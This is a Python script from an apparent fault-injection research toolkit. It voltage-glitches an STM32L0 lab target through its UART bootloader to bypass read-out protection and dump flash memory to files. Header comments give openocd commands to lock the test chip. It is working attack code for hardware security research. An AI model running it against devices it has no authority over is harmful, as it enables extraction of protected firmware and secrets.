# Copyright (C) 2024 Dr. Matthias Kesenheimer - All Rights Reserved.
# You may use, distribute and modify this code under the terms of the GPL3 license.
#
# You should have received a copy of the GPL3 license with this file.
# If not, please write to: m.kesenheimer@gmx.net.

# programming
# > openocd -f interface/stlink.cfg -c "transport select hla_swd" -f target/stm32l0.cfg -c "init; halt; stm32l0x unlock 0; exit"
# > openocd -f interface/stlink.cfg -c "transport select hla_swd" -f target/stm32l0.cfg -c "init; halt; program read-out-protection-test-CW308_STM32L0.bin verify reset exit 0x08000000;"
# > openocd -f interface/stlink.cfg -c "transport select hla_swd" -f target/stm32l0.cfg -c "init; halt; stm32l0x lock 0; sleep 2000; reset run; shutdown"
# -> power cycle the target!

#!/usr/bin/env python3
import argparse
import logging
import random
import sys
import time

# import custom libraries
sys.path.insert(0, "../lib/")
from BootloaderCom import BootloaderCom
from FaultInjectionLib import Database, ProGlitcher, Helper


# inherit functionality and overwrite some functions
class DerivedGlitcher(ProGlitcher):
    def classify(self, expected, response):
        if response == expected:
            color = "G"
        elif response == 0:
            color = "R"
        elif response > 0:
            color = "M"
        else:
            color = "Y"
        return color


class Main:
    def __init__(self, args):
        self.args = args

        logging.basicConfig(filename="execution.log", filemode="a", format="%(asctime)s %(message)s", level=logging.INFO, force=True)

        self.glitcher = DerivedGlitcher()
        self.glitcher.init()

        # we want to trigger on x11 with the configuration 8e1
        # since our statemachine understands only 8n1,
        # we can trigger on x22 with the configuration 9n1 instead
        # Update: Triggering on x11 in configuration 8n1 works good enough.
        self.glitcher.uart_trigger(0x11)

        # set up the database
        self.database = Database(sys.argv, resume=self.args.resume)
        self.bootcom = BootloaderCom(port=self.args.target)

        self.start_time = int(time.time())

        self.successive_fails = 0
        self.response_before = 0

        # memory read settings
        self.current_dump_addr = 0x08000000
        self.current_dump_len = 0x200000
        self.file_index = 0
        self.dump_filename = f"{Helper.timestamp()}_memory_dump_{self.file_index}.bin"

    def run(self):
        # log execution
        logging.info(" ".join(sys.argv))

        s_length = self.args.length[0]
        e_length = self.args.length[1]
        s_delay = self.args.delay[0]
        e_delay = self.args.delay[1]

        expected = -4
        experiment_id = 0
        while True:
            # set up glitch parameters (in nano seconds) and arm glitcher
            length = random.randint(s_length, e_length)
            delay = random.randint(s_delay, e_delay)
            self.glitcher.arm(delay, length)

            # reset target
            #glitcher.reset(0.01)
            self.glitcher.power_cycle_target()
            time.sleep(0.2)

            # setup bootloader communication
            response = self.bootcom.init_get_id()

            # setup bootloader communication, this function triggers the glitch
            if response == 0:
                response = self.bootcom.setup_memread(self.glitcher.set_trigger_out)
                # reset the crowbar transistors after glitch
                self.glitcher.reset_glitch()

            # read memory if RDP is inactive
            mem = b""
            glitch_successes = 0
            read_sucesses = 0
            while response == 0:
                len_to_dump = 0xFF if (self.current_dump_len // 0xFF) else self.current_dump_len % 0xFF
                response, mem = self.bootcom.read_memory(self.current_dump_addr, len_to_dump)
                # glitch successful, however memory read may still yield invalid results
                glitch_successes += 1
                #if len(mem) == len_to_dump and mem != b"\x79" * len_to_dump:
                if True: # DEBUG: write out everything, no matter what
                    read_sucesses += 1
                    with open(self.dump_filename, 'ab+') as f:
                        f.write(mem)
                    self.current_dump_len -= len_to_dump
                    print(f"[+] Dumped 0x{len_to_dump:x} bytes from addr 0x{self.current_dump_addr:x}, {self.current_dump_len:x} bytes left")
                    logging.info(f"Dumped 0x{len_to_dump:x} bytes from addr 0x{self.current_dump_addr:x}, {self.current_dump_len:x} bytes left")
                    self.current_dump_addr += len_to_dump

            # reset memory dump if current_dump_len reaches zero
            if self.current_dump_len <= 0:
                self.current_dump_addr = 0x08000000
                self.current_dump_len = 0x400
                self.file_index += 1
                self.dump_filename = f"{Helper.timestamp()}_memory_dump_{self.file_index}.bin"

            # "classify" successful glitches
            if glitch_successes > 0:
                response = glitch_successes
            if read_sucesses > 0:
                response = 0

            # classify response
            color = self.glitcher.classify(expected, response)

            # add to database
            response_str = str(response).encode("utf-8")
            self.database.insert(experiment_id, delay, length, color, response_str)

            # monitor
            speed = self.glitcher.get_speed(self.start_time, experiment_id)
            experiment_base_id = self.database.get_base_experiments_count()
            print(self.glitcher.colorize(f"[+] Experiment {experiment_id}\t{experiment_base_id}\t({speed})\t{length}\t{delay}\t{color}\t{response_str}", color))

            # increase experiment id
            experiment_id += 1

            # exit if too many successive fails (including a supposedly successful memory read)
            if response in (0, -1, -3, -5, -6) and self.response_before in (0, -1, -3, -5, -6):
                self.successive_fails += 1
            else:
                self.successive_fails = 0
            if self.successive_fails >= 20:
                # delete the eroneous datapoints, but not the first
                for eid in range(experiment_id - 19, experiment_id):
                    self.database.remove(eid)
                # ... and try again
                self.glitcher.reconnect_with_uart(pattern=0x11, disconnect_wait=1)
                self.glitcher.power_cycle_target(1)
                time.sleep(1)
                self.bootcom.flush()
                self.successive_fails = 0
                #break
            self.response_before = response


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", required=False, help="target port", default="/dev/ttyUSB1")
    parser.add_argument("--delay", required=True, nargs=2, help="delay start and end", type=int)
    parser.add_argument("--length", required=True, nargs=2, help="length start and end", type=int)
    parser.add_argument("--resume", required=False, action='store_true', help="if an previous dataset should be resumed")
    args = parser.parse_args()

    glitcher = Main(args)

    try:
        glitcher.run()
    except KeyboardInterrupt:
        print("\nExitting...")
        sys.exit(1)